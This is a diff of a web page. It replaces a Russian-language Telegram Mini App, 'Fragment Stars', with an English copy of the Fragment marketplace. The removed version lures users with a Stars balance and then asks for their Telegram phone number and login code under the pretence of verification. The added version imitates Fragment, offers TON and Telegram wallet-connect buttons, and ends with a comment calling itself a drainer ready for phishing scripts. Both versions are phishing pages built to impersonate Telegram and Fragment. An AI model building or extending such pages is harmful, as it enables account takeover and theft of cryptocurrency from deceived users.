@@ -1,408 +1,163 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Fragment Stars</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --bg: #0a0a0f;
-      --card: #1a1a2e;
-      --text: #e0e7ff;
-      --accent: #00d4ff;
-      --purple: #a855f7;
-      --blue: #3b82f6;
-      --neon: 0 0 20px rgba(168, 85, 247, 0.6);
-      --tg-bg: #ffffff;
-      --tg-text: #000000;
-      --tg-hint: #888888;
-      --tg-blue: #229ED9;
-      --tg-input: #f0f0f0;
-      --tg-border: #e0e0e0;
-    }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Inter', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      padding-bottom: 80px;
-      overflow: hidden;
-      position: relative;
-      opacity: 0;
-      transition: opacity 0.6s ease;
-    }
-    body.loaded { opacity: 1; }
-
-    /* === ЗАГРУЗКА === */
-    #loader {
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: var(--bg); display: flex; flex-direction: column;
-      align-items: center; justify-content: center; z-index: 9999;
-      opacity: 0; visibility: hidden;
-      transition: opacity 0.6s ease;
-    }
-    #loader.active { opacity: 1; visibility: visible; }
-
-    .spinner {
-      width: 48px; height: 48px; border: 4px solid #2a2a3a;
-      border-top: 4px solid var(--accent); border-radius: 50%;
-      animation: spin 1s linear infinite; margin-bottom: 16px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .progress-bar { width: 200px; height: 6px; background: #2a2a3a; border-radius: 3px; overflow: hidden; margin-top: 16px; }
-    .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--purple), var(--blue)); border-radius: 3px; }
-
-    /* === ВКЛАДКИ === */
-    .tab-content {
-      position: absolute; top: 0; left: 0; right: 0;
-      padding: 20px 16px; display: none; opacity: 0; transform: translateY(30px);
-      transition: opacity 0.5s cubic-bezier(0.25, 0.8, 0.25, 1), transform 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
-      flex-direction: column; align-items: center; justify-content: center;
-      width: 100%; height: calc(100% - 80px);
-    }
-    .tab-content.active { display: flex; opacity: 1; transform: translateY(0); z-index: 1; }
-
-    /* === БАЛАНС, ПРОФИЛЬ, ИСТОРИЯ === */
-    .balance-card, .profile-card, .history-card {
-      background: linear-gradient(145deg, #1a1a2e, #16213e);
-      border-radius: 28px; padding: 40px 24px; text-align: center;
-      width: 90%; max-width: 400px; position: relative; overflow: hidden;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon);
-      animation: cardGlow 6s infinite;
-    }
-    @keyframes cardGlow { 0%, 100% { box-shadow: 0 20px 40px rgba(0,0,0,0.4), var(--neon); } 50% { box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 30px rgba(168, 85, 247, 0.8); } }
-
-    .star-container { width: 120px; height: 120px; margin: 0 auto 24px; filter: drop-shadow(0 0 20px var(--purple)); animation: starPulse 3s infinite; }
-    @keyframes starPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
-
-    .balance-amount { font-size: 64px; font-weight: 700; background: linear-gradient(90deg, var(--purple), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
-    .balance-label { font-size: 18px; color: #94a3b8; margin-bottom: 32px; }
-
-    .withdraw-btn { background: rgba(255,255,255,0.1); color: #ccc; border: 1px solid rgba(255,255,255,0.2); padding: 14px; border-radius: 16px; width: 100%; font-weight: 600; font-size: 16px; cursor: pointer; }
-
-    .avatar { width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 16px; overflow: hidden; box-shadow: var(--neon); }
-    .username { font-size: 24px; font-weight: 700; background: linear-gradient(90deg, var(--purple), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
-    .join-date { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
-    .verification-status { display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 14px; color: #f59e0b; margin-bottom: 16px; }
-    .status-dot { width: 10px; height: 10px; background: #f59e0b; border-radius: 50%; animation: blink 1.5s infinite; }
-    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-    .verify-btn { background: linear-gradient(90deg, var(--purple), var(--blue)); color: white; font-weight: 600; font-size: 16px; padding: 14px; border: none; border-radius: 16px; width: 100%; cursor: pointer; }
-
-    .history-card { color: #94a3b8; font-size: 16px; }
-
-    /* === МОДАЛЬНОЕ ОКНО ТГ === */
-    .tg-modal {
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-      background: var(--tg-bg); display: none; flex-direction: column;
-      padding: 20px; z-index: 1000; color: var(--tg-text);
-    }
-    .tg-modal.active { display: flex; }
-
-    .tg-logo-container {
-      display: flex; align-items: center; justify-content: center;
-      gap: 12px; margin-bottom: 32px;
-    }
-    .tg-logo {
-      width: 48px; height: 48px; border-radius: 50%; overflow: hidden;
-    }
-    .tg-logo img { width: 100%; height: 100%; object-fit: contain; }
-    .tg-arrow { font-size: 24px; color: var(--tg-blue); font-weight: bold; }
-
-    .tg-title {
-      font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 8px; line-height: 1.2;
-    }
-    .tg-subtitle {
-      font-size: 16px; color: var(--tg-hint); text-align: center; margin-bottom: 32px; line-height: 1.4;
-    }
-
-    .tg-phone-input {
-      display: flex; gap: 8px; margin-bottom: 32px;
-    }
-    .tg-country-code {
-      width: 70px; padding: 16px 8px; background: var(--tg-input); border: 1px solid var(--tg-border);
-      border-radius: 12px; font-size: 18px; font-weight: 500; text-align: center;
-    }
-    .tg-phone-number {
-      flex: 1; padding: 16px 20px; background: var(--tg-input); border: 1px solid var(--tg-border);
-      border-radius: 12px; font-size: 18px; font-weight: 500; text-align: center;
-    }
-    .tg-phone-input input:focus {
-      outline: none; border-color: var(--tg-blue);
-    }
-
-    .tg-button-group {
-      display: flex; justify-content: space-between; gap: 16px;
-    }
-    .tg-btn {
-      flex: 1; padding: 14px; border-radius: 12px; font-size: 17px; font-weight: 600; text-align: center; cursor: pointer;
-    }
-    .tg-btn-cancel {
-      background: transparent; color: var(--tg-blue); border: 1px solid var(--tg-blue);
-    }
-    .tg-btn-next {
-      background: var(--tg-blue); color: white;
-    }
-
-    /* === ЭКРАН КОДА === */
-    .tg-code-container {
-      width: 100px; height: 100px; margin: 0 auto 32px; font-size: 80px; line-height: 1;
-    }
-
-    .tg-code-title { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; }
-    .tg-code-subtitle { font-size: 16px; color: var(--tg-hint); text-align: center; margin-bottom: 32px; }
-    .tg-code-inputs { display: flex; justify-content: center; gap: 12px; margin-bottom: 32px; }
-    .tg-code-digit { width: 52px; height: 62px; border: 1px solid var(--tg-border); border-radius: 12px; background: #f7f7f7; color: var(--tg-text); font-size: 28px; font-weight: 600; text-align: center; }
-    .tg-resend { color: var(--tg-blue); font-size: 15px; text-align: center; cursor: pointer; margin-bottom: 32px; }
-
-    /* === BOTTOM NAV === */
-    .bottom-nav {
-      position: fixed; bottom: 0; left: 0; right: 0;
-      background: rgba(26, 26, 46, 0.95); backdrop-filter: blur(10px);
-      border-top: 1px solid rgba(255,255,255,0.1);
-      display: flex; justify-content: space-around; padding: 12px 0 20px; z-index: 1000;
-    }
-    .nav-item {
-      display: flex; flex-direction: column; align-items: center;
-      gap: 6px; color: #64748b; font-size: 13px; font-weight: 600;
-      flex: 1; cursor: pointer; transition: color 0.3s ease;
-    }
-    .nav-item.active { color: var(--accent); }
-    .nav-item svg { width: 28px; height: 28px; fill: currentColor; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FRAGMENT</title>
+    <style>
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0C0C0C; color: #FFFFFF; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px; background: #0C0C0C; border-bottom: 1px solid #333; }
+        .logo { font-size: 24px; font-weight: bold; color: #0066FF; }
+        .nav { display: flex; gap: 20px; }
+        .nav a { color: #888; text-decoration: none; }
+        .nav .active { color: #0066FF; }
+        .section { padding: 20px; }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab { padding: 10px 20px; background: #222; border-radius: 20px; color: #888; text-decoration: none; }
+        .tab.active { background: #0066FF; color: white; }
+        .buy-sell { background: #1A1A1A; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
+        .search { display: flex; background: #333; border-radius: 25px; padding: 10px; margin-bottom: 20px; }
+        .search input { flex: 1; background: none; border: none; color: white; outline: none; }
+        .auction-list { display: flex; flex-direction: column; gap: 10px; }
+        .auction-item { display: flex; justify-content: space-between; align-items: center; background: #222; padding: 15px; border-radius: 10px; }
+        .auction-name { color: #0066FF; }
+        .bid { color: #888; }
+        .time { color: #666; }
+        .feature-card { background: #1A1A1A; border-radius: 15px; padding: 20px; text-align: center; margin: 20px 0; }
+        .feature-icon { font-size: 48px; color: #0066FF; margin-bottom: 10px; }
+        .btn { background: #0066FF; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; margin: 10px 0; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; }
+        .modal-content { background: #0C0C0C; margin: 10% auto; padding: 20px; border-radius: 10px; width: 300px; }
+        .close { float: right; cursor: pointer; color: #888; }
+        @media (max-width: 600px) { .header, .auction-item { flex-direction: column; gap: 10px; } }
+    </style>
 </head>
 <body>
-
-  <!-- ЗАГРУЗКА -->
-  <div id="loader" class="active">
-    <div class="spinner"></div>
-    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
-  </div>
-
-  <!-- Баланс -->
-  <div id="balance" class="tab-content">
-    <div class="balance-card">
-      <div class="star-container">
-        <img src="Local/Star Symbol/Star.png" alt="Star" class="star-icon">
-      </div>
-      <div class="balance-amount">0</div>
-      <div class="balance-label">Telegram Stars</div>
-      <button class="withdraw-btn" onclick="checkVerification()">Вывести</button>
-    </div>
-  </div>
-
-  <!-- Профиль -->
-  <div id="profile" class="tab-content">
-    <div class="profile-card">
-      <div class="avatar" id="avatar">
-        <div style="width:100%;height:100%;background:#2a2a3a;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#555;font-size:40px;">?</div>
-      </div>
-      <div class="username" id="username">—</div>
-      <div class="join-date" id="joinDate">—</div>
-      <div class="verification-status">
-        <div class="status-dot"></div>
-        <span>Ограниченная</span>
-      </div>
-      <button class="verify-btn" onclick="openPhoneModal()">Пройти верификацию</button>
-    </div>
-  </div>
-
-  <!-- История -->
-  <div id="history" class="tab-content">
-    <div class="history-card">
-      История операций пуста
-    </div>
-  </div>
-
-  <!-- ШАГ 1: ВВОД НОМЕРА -->
-  <div id="phoneModal" class="tg-modal">
-    <div class="tg-logo-container">
-      <div class="tg-logo"><img src="Local/Tg/Tg.png" alt="Telegram"></div>
-      <div class="tg-arrow">→</div>
-      <div class="tg-logo"><img src="Local/Fragment/Fragment.png" alt="Fragment"></div>
+    <div class="header">
+        <div class="logo">△ FRAGMENT</div>
+        <div class="nav">
+            <a href="#" class="tab">⋮⋮⋮</a>
+        </div>
     </div>
 
-    <h1 class="tg-title">Войдите, чтобы<br>использовать аккаунт<br>Telegram</h1>
-    <p class="tg-subtitle">
-      для fragment.com и Fragment Auction Alerts.<br>
-      Введите свой номер телефона в международном формате.<br>
-      Подтверждение будет отправлено в Telegram.
-    </p>
-
-    <div class="tg-phone-input">
-      <input type="text" class="tg-country-code" id="countryCode" value="7" maxlength="3" inputmode="numeric" placeholder="7">
-      <input type="tel" class="tg-phone-number" id="phoneNumber" placeholder="___ ___ __ __" inputmode="numeric">
+    <!-- Usernames Section -->
+    <div class="section">
+        <div class="tabs">
+            <a href="#" class="tab active">Usernames</a>
+            <a href="#" class="tab">Numbers</a>
+            <a href="#" class="tab">Stars</a>
+            <a href="#" class="tab">Prem</a>
+        </div>
+        <div class="buy-sell">
+            <h2>Buy and Sell Usernames</h2>
+            <p>Secure your name with blockchain in an ecosystem of 1+ billion users and assign it as a link to your personal account, channel or group. <a href="#" style="color: #0066FF;">Learn more ></a></p>
+            <div class="search">
+                <input type="text" placeholder="Enter a Telegram username...">
+            </div>
+            <div class="auction-list">
+                <div class="auction-item">
+                    <div>
+                        <div class="auction-name">@dangerous</div>
+                        <div>dangero.us.t.me</div>
+                    </div>
+                    <div class="bid">△6,836</div>
+                    <div class="time">2 days 8 hours left ></div>
+                </div>
+                <div class="auction-item">
+                    <div>
+                        <div class="auction-name">@shanghai</div>
+                        <div>shangha.i.t.me</div>
+                    </div>
+                    <div class="bid">△6,300</div>
+                    <div class="time">2 hours 20 minutes left ></div>
+                </div>
+                <!-- Add more items as in screenshot -->
+                <div class="auction-item">
+                    <div>
+                        <div class="auction-name">@kian</div>
+                        <div>kian.t.me</div>
+                    </div>
+                    <div class="bid">△5,611</div>
+                    <div class="time">4 days 21 hours left ></div>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <div class="tg-button-group">
-      <div class="tg-btn tg-btn-cancel" onclick="closePhoneModal()">ОТМЕНА</div>
-      <div class="tg-btn tg-btn-next" onclick="goToCodeStep()">ДАЛЕЕ</div>
+    <!-- Numbers Section (toggle via JS if needed) -->
+    <div class="section" style="display: none;">
+        <div class="buy-sell">
+            <h2>Buy and Sell Collectible Numbers</h2>
+            <p>Trade IDs not tied to a SIM card which allow logging into Telegram with your blockchain account. These numbers only work on Telegram. <a href="#" style="color: #0066FF;">Learn more ></a></p>
+            <p>All 136,566 numbers sold out in December 2022. Now, you can only buy from an existing owner.</p>
+            <div class="search">
+                <input type="text" placeholder="+888 Enter a phone number...">
+            </div>
+            <div class="auction-list">
+                <div class="auction-item">
+                    <div>
+                        <div class="auction-name">+888 8050 Resale</div>
+                    </div>
+                    <div class="bid">△94,500</div>
+                    <div class="time">8 hours 3 minutes left ></div>
+                </div>
+                <!-- More as per screenshot -->
+            </div>
+        </div>
     </div>
-  </div>
 
-  <!-- ШАГ 2: ВВОД КОДА -->
-  <div id="codeModal" class="tg-modal">
-    <div class="tg-code-container">Telegram</div>
-
-    <h2 class="tg-code-title">Введите код</h2>
-    <p class="tg-code-subtitle" id="codePhone">Код отправлен на +7 ___ ___ __ __</p>
-
-    <div class="tg-code-inputs">
-      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 0)">
-      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 1)">
-      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 2)">
-      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 3)">
-      <input type="text" class="tg-code-digit" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 4)">
+    <!-- Stars Section -->
+    <div class="section feature-card">
+        <div style="font-size: 48px; color: #0066FF;">⭐</div>
+        <h2>Telegram Stars</h2>
+        <p>Top up Stars balance for yourself or your friends and colleagues.</p>
+        <button class="btn">Buy Stars Package</button>
     </div>
 
-    <div class="tg-resend" onclick="resendCode()">Отправить код повторно</div>
-
-    <div class="tg-button-group">
-      <div class="tg-btn tg-btn-cancel" onclick="backToPhone()">НАЗАД</div>
-      <div class="tg-btn tg-btn-next" onclick="completeVerification()">ДАЛЕЕ</div>
+    <!-- Premium Section -->
+    <div class="section feature-card">
+        <div style="font-size: 48px; color: #0066FF;">⭐</div>
+        <h2>Telegram Premium</h2>
+        <p>Use your cryptowallet to acquire Telegram Premium subscription for yourself or your friends.</p>
+        <button class="btn">Buy Premium for a User</button>
     </div>
-  </div>
 
-  <!-- НИЖНЯЯ ПАНЕЛЬ -->
-  <div class="bottom-nav">
-    <div class="nav-item" onclick="openTab('balance')">
-      <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
-      <span>Баланс</span>
+    <!-- Advertisers Section -->
+    <div class="section feature-card">
+        <div style="font-size: 48px; color: #0066FF;">💬</div>
+        <h2>For Advertisers</h2>
+        <p>Use your cryptowallet to pay for ads to be displayed in public broadcast channels on Telegram.</p>
+        <button class="btn">Pay for Ads</button>
     </div>
-    <div class="nav-item" onclick="openTab('profile')">
-      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-      <span>Профиль</span>
+
+    <!-- Connect Modal -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h3>FRAG PLATFORM</h3>
+            <ul style="list-style: none; padding: 0;">
+                <li><a href="#">User</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Terms</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+            </ul>
+            <p>Connect TON and Telegram to view your bids and assets</p>
+            <button class="btn">△ Connect TON</button>
+            <button style="background: #0088CC; margin-top: 10px;">→ Connect Telegram</button>
+        </div>
     </div>
-    <div class="nav-item" onclick="openTab('history')">
-      <svg viewBox="0 0 24 24"><path d="M13 3a9 9 0 0 0-8.58 6.25l1.65.1A7.5 7.5 0 1 1 4.5 12h2.08l-1.77 1.77 1.42 1.41L10.73 11H9v-2h5v5h-2v-1.27l-2.5 2.5 1.42 1.41L13 14.18V16h5v-5h-2v1.27l-2.5-2.5-1.42-1.41L15 11V9h-2V3h-2z"/></svg>
-      <span>История</span>
-    </div>
-  </div>
 
-  <script>
-    // === ЗАГРУЗКА ===
-    window.addEventListener('load', () => {
-      const progress = document.getElementById('progress');
-      const loader = document.getElementById('loader');
-      let current = 0;
-      const timer = setInterval(() => {
-        current += 2;
-        progress.style.width = current + '%';
-        if (current >= 100) {
-          clearInterval(timer);
-          setTimeout(() => {
-            loader.classList.remove('active');
-            setTimeout(() => {
-              document.body.classList.add('loaded');
-              openTab('balance');
-            }, 100);
-          }, 300);
-        }
-      }, 20);
-    });
-
-    // === ТЕЛЕГРАМ ===
-    if (window.Telegram?.WebApp) {
-      Telegram.WebApp.ready(); Telegram.WebApp.expand();
-      const user = Telegram.WebApp.initDataUnsafe.user;
-      if (user) {
-        document.getElementById('username').textContent = user.username ? `@${user.username}` : (user.first_name || 'Гость');
-        if (user.photo_url) document.getElementById('avatar').innerHTML = `<img src="${user.photo_url}" alt="Avatar">`;
-        const now = new Date();
-        document.getElementById('joinDate').textContent = `${now.toLocaleDateString('ru-RU')} — ${now.toTimeString().slice(0, 8)}`;
-      }
-    }
-
-    // === ВКЛАДКИ ===
-    function openTab(tabName) {
-      document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-      document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-      const target = document.getElementById(tabName);
-      const nav = document.querySelector(`[onclick="openTab('${tabName}')"]`);
-      target.style.display = 'flex';
-      setTimeout(() => {
-        target.classList.add('active');
-        nav.classList.add('active');
-      }, 10);
-    }
-
-    // === ВЕРИФИКАЦИЯ ===
-    function checkVerification() {
-      alert('Сначала пройдите верификацию!');
-      openTab('profile');
-    }
-
-    function openPhoneModal() {
-      document.getElementById('phoneModal').classList.add('active');
-    }
-
-    function closePhoneModal() {
-      document.getElementById('phoneModal').classList.remove('active');
-    }
-
-    // === КОД СТРАНЫ: ТОЛЬКО + НЕЛЬЗЯ СТЕРЕТЬ ===
-    const countryCode = document.getElementById('countryCode');
-    countryCode.addEventListener('input', function(e) {
-      let val = e.target.value.replace(/\D/g, '');
-      if (val === '') val = '7';
-      e.target.value = val;
-    });
-
-    // === НОМЕР: ФОРМАТ ===
-    const phoneNumber = document.getElementById('phoneNumber');
-    phoneNumber.addEventListener('input', function(e) {
-      let val = e.target.value.replace(/\D/g, '').slice(0, 10);
-      if (val.length > 6) val = val.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
-      else if (val.length > 3) val = val.replace(/(\d{3})(\d{3})/, '$1 $2');
-      e.target.value = val;
-    });
-
-    // === ПЕРЕХОД К КОДУ ===
-    function goToCodeStep() {
-      const code = countryCode.value.trim();
-      const num = phoneNumber.value.replace(/\D/g, '');
-      if (!code || code.length < 1 || code.length > 3) return alert('Код страны: 1–3 цифры');
-      if (num.length !== 10) return alert('Введите полный номер');
-
-      const formatted = num.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
-      document.getElementById('codePhone').textContent = `Код отправлен на +${code} ${formatted}`;
-
-      document.getElementById('phoneModal').classList.remove('active');
-      document.getElementById('codeModal').classList.add('active');
-      setTimeout(() => document.querySelector('.tg-code-digit').focus(), 100);
-    }
-
-    function backToPhone() {
-      document.getElementById('codeModal').classList.remove('active');
-      document.getElementById('phoneModal').classList.add('active');
-    }
-
-    function moveToNext(input, index) {
-      input.value = input.value.replace(/\D/g, '');
-      if (input.value && index < 4) {
-        document.querySelectorAll('.tg-code-digit')[index + 1].focus();
-      }
-    }
-
-    function resendCode() {
-      alert('Код отправлен повторно');
-    }
-
-    function completeVerification() {
-      const digits = Array.from(document.querySelectorAll('.tg-code-digit')).map(d => d.value);
-      if (digits.some(d => !d)) return alert('Введите код полностью');
-      alert('Верификация пройдена!');
-      document.getElementById('codeModal').classList.remove('active');
-      document.querySelector('.verification-status span').textContent = 'Пройденная';
-      document.querySelector('.verification-status').style.color = '#10b981';
-      document.querySelector('.status-dot').style.background = '#10b981';
-    }
-  </script>
+    <script>
+        // Basic interactions
+        document.querySelectorAll('.tab').forEach(tab => tab.addEventListener('click', (e) => {
+            e.preventDefault();
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            e.target.classList.add('active');
+            // Toggle sections based on tab (implement as needed)
+        }));
+        document.querySelector('.close').addEventListener('click', () => document.getElementById('modal').style.display = 'none');
+        // Add wallet connect logic here later, e.g., tonconnect-ui for TON
+        console.log('Drainer ready—hook your phishing scripts to forms!');
+    </script>
 </body>
 </html>
